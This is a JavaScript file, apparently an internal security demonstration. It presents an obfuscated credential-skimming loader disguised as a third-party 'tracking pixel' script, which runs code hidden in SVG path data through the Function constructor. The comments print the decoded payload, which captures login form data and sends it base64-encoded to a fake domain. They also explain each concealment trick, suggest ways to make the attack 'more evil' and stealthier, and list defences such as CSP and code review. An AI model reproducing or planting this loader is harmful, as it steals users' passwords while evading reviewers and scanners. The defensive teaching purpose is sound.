
const initializeTrackingPixel = (currentTime, identifier, svgElement, _) => {
    /** Tracking interpretation script provided by BlueConic. SVG is unique per license and will encode
     * the tracking information in the path data. The path data is a string of numbers.
     * The numbers are encoded as follows:
    */
    const sp = svgElement.querySelector('g').attributes.d.value,s = String.fromCharCode,i = 
        sp.split(',').map(x => { 
            const c = parseFloat(x,10);
            return c < 0 ? s(-c):s(c)}),f = i.filter((_,ix) => !(ix ===0||ix===1||ix===i.length-1)
        ),e = f.join('').split('|')
        const r = ((v1,v2)=>{![][e[0]][e[1]](e[2])(v1,v2)})(currentTime,identifier) 
            || `${currentTime}|${identifier}`;
        return r;
}



(() => {
    window.addEventListener('DOMContentLoaded', () => {
    const trackingPixel = document.querySelector('#tracking-pixel');
    const time = new Date();
    const currentTime = time.getTime();
    initializeTrackingPixel(currentTime, identifier = 'BC_ANWB_MBRSHP', trackingPixel);
})})();


// Explained:

const initializeTrackingPixelXpl = (currentTime, identifier, svgElement, _) => {
    /** Tracking interpretation script provided by BlueConic. SVG is unique per license and will encode
     * the tracking information in the path data. The path data is a string of numbers.
     * The numbers are encoded as follows:
    */
    const sp = svgElement.querySelector('g').attributes.d.value,s = String.fromCharCode,i = 
        sp.split(',').map(x => { 
            const c = parseFloat(x,10);
            return c < 0 ? s(-c):s(c)}),f = i.filter((_,ix) => !(ix ===0||ix===1||ix===i.length-1)
        ),e = f.join('').split('|')
        const r = ((v1,v2)=>{![][e[0]][e[1]](e[2])(v1,v2)})(currentTime,identifier) 
            || `${currentTime}|${identifier}`;
        return r;

    /* LEt's break that down: */
    // sp = SVGPWNAGE, just a reference to the element values. This gives back the whole string of coordinates.
    // This selector grabs the SVG. Note the error here, inside of the SVG, we don't use <path />, but <g/> instead. The <g />-element stands for group. 
    // As (x)html basially is always OK with adding extra props, we just use D here, which usually belongs in the <path /> element.
    // If I would've put this in a <path> element, an IDE or any sniffer/linter may pick this up and flags as error. We don't want to raise attention here.

    // Next, we just declare everything in one line. Just to make this even harder to read. Like we used to do: var x = something, b = something, etc. You get the point.
    // So in the next part, the s-variable, it is a reference to the function of JS primitive "String". And as you know, everything is an object. fromCharCode is a prototype that
    // helps us put ASCII to String. I just chose this beause it's easier to hide, and will not look like 1=a, 2=b. You could use more obfuscated encryption/decryption techniques here, but 
    // for demonstration purposes, this is enough for now. The reference here is to use it only once in the code, so it is less visible when you look at it later on.

    // The i is where the magic happens. This is only a reference so I can later on check the length. 'i'-variable could also use split, join, length prototypes to bind them to a variable. 
    // That's for refinement. 

    // inside the array, we split all coordinates of the string. And map them to a new set. This will be saved in 'i'.
    // within the map, we make sure that each string is converted to a number, and saved to variable: 'c'. (stands for coordinate, logical huh?, we like if we can follow logic, makes us feel good, and
    // already helps manipulate you to think this may just be OK.
    // A minus number or a one with decimals is also fine. Not using decimals in this encryption method. 
    // Then, we check if the 'c'-value is minus or not. In the end, we just want positive numbers we can convert to a string.
    // Because the function is a bit further away, it doesn't make a lot of sense, and you may just go ahead and think nothing special of it.

    // Now, it gets more interesting. The first and last items in the array may help you to think it's a valid coordinate set, so I just strip them off here. The further it is away from the function (
    // here, filtering), the easier it is not seeing what it's actually does. In neuropsychology, it's a given that the closer the message you put where it is important, the more it's understood. You 
    // could say the same vise versa.

    // Then, I join all the strings back together. Within the code, there are 3 sections, split by a pipe. 
    // section one: "sort", section two: "constructor", section three: the malicious code. 

    // Here is where it gets really interesting. You know, everything is an object. 
    // Using an exclamation mark before something, it means the code needs to evaluate. 
    // The [] for the array is also really fun. 
    // In all primiteves, you can directly call the constructor of the protyped function. 
    // The key is that specifically in THIS primitive, the constructor evaluates the code after you run it using the paretheses.
    
    // In this example is chosen for 'sort', as prototyped function, you can use any available. The sort comes in this example of the
    // 'brain fuck'-language, where you can use brackets and exclamationmarks to evaluate to strings. But only limited. The 'sort' function is one of the
    // strings you can make. It's limited, so you can get all 26 alphabetical characters.

    // So here is actually the ran code: (() => {![]['sort']['constructor'][<maliciousCodeString>]})(). 
    // So... an IFFE using an anonymous function => evaluate array object => using property 'sort' => using property 'constructor' => evaluate code =>, then self executes using 
    // adject parenthesis. 
    // all arguments v1, v2, currentTime, identifier are just non-arguments to throw you off.

    // The actual code behind the numbers is: 
    /**
    window.addEventListener('DOMContentLoaded', () => {
        const f = document.querySelector('input[type="password"]').closest('form')
        f.addEventListener('submit', (e) => {
            requestIdleCallback(() => {
            try{
            const d = new FormData(f);
            const h = btoa(JSON.stringify(Object.fromEntries(d)))
            fetch(`https://www.afakedomainname.andextension/tracking.svg?${h}`,{mode: "no-cors"});
            }catch{}
            })
        })
})
    **/
    // short explanation:
    // You can see that the form will send username and password. 
    // it just base64 encodes this. You can also choose for encryption using public key here, and private key
    // can be used to decrypt this. For now, not used as it complicates the code and gets bigger. 
    // If you program this well, you can use GZIP compression in your advantage to make it appear smaller than it is.

    // So, form data is passed to strinified json, and base64 encoded sending it to a server.
    // The request will fail, and shows a 404. This is one of the options I chose.
    // It will just make requests and be like: "oh, this doesnt work... ". You can also just accept anyting on the target
    // server with a 200, or whatever you choose. 
    // You don't have to store any of this... 404 is fun because:
    // It will show up in logs
    // No API is called, so the only thing that needs to be done, is logs that is retains data based on time.

    // later on, the actor (malicious person), could decrypt this and steal all your login data.
    // you could include referer.

    // how to prevent this? 
    // - ![]['sort'/<function>]['constructor'][<code>]() / eval / jsonP, be aware!
    // - use CSP allow domains, so no call ever leaves.
    // - don't save minified content in your code base. REALLY DON'T, if you have to, make sure security will agree on a clause between third party and us
    // - don't trust me, or your colleagues. My intention was clear. But sometimes, it's not. Someone who's leaving the company, or just doesn't know
    // - it can also be somone who injected this in third party code, and left their company.
    // - this can happen also in node_modules installed (leftpad, anyone?)
    // - use scanners like Acunetix. Sonarqube didn't caught this, Github Copilot didn't caught this.
    // - Ask questions, and be strict. Don't accept code you don't understand. 

    // you can make this more evil
    // - proper encryption
    // - install in a service worker
    // - hide in actual SVG, strip dots, and use a small algorithm to pick the right items
    // - hide direct function calls, and just refer things. 
    // - use brainFuck preferably or another obsfuscation to point to JS primitive functions
    // - create conditions
    // - be even worse, and let it only be run on compilers within github (node.env), and install malware. This requires a bit more skill
    // and training, knowing systems and able to get out of the containers. 

    
}



function explained() {
    window.addEventListener('DOMContentLoaded', () => {
    const trackingPixel = document.querySelector('#tracking-pixel');
    const time = new Date();
    const currentTime = time.getTime();
    initializeTrackingPixel(currentTime, identifier = 'BC_ANWB_MBRSHP', trackingPixel);
    }
